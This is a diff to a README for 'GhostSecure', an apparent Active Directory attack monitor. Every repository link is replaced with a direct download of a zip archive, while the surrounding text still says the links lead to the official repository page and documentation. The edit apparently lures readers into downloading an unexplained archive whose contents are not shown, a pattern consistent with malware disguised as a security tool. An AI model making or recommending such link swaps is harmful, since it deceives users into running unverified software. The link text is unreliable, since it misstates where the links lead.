@@ -1,6 +1,6 @@
 # 👻 GhostSecure - Monitor Active Directory Attacks Live
 
-[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-brightgreen)](https://github.com/thurstonaptitudinal132/GhostSecure)
+[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-brightgreen)](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)
 
 ---
 
@@ -50,7 +50,7 @@ GhostSecure is designed for typical workstations or servers used to monitor netw
 
 Start by downloading GhostSecure using the large button below. It will take you to the official GitHub repository page.
 
-[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-blue)](https://github.com/thurstonaptitudinal132/GhostSecure)
+[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-blue)](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)
 
 Follow the steps below to get it running on your Windows machine.
 
@@ -174,6 +174,6 @@ Delete the installation folder if you want to remove all files.
 
 For full documentation, issue reporting, and updates visit the official GitHub page:
 
-[https://github.com/thurstonaptitudinal132/GhostSecure](https://github.com/thurstonaptitudinal132/GhostSecure)
+[https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)
 
 You will find user guides, technical details, and the latest versions here.
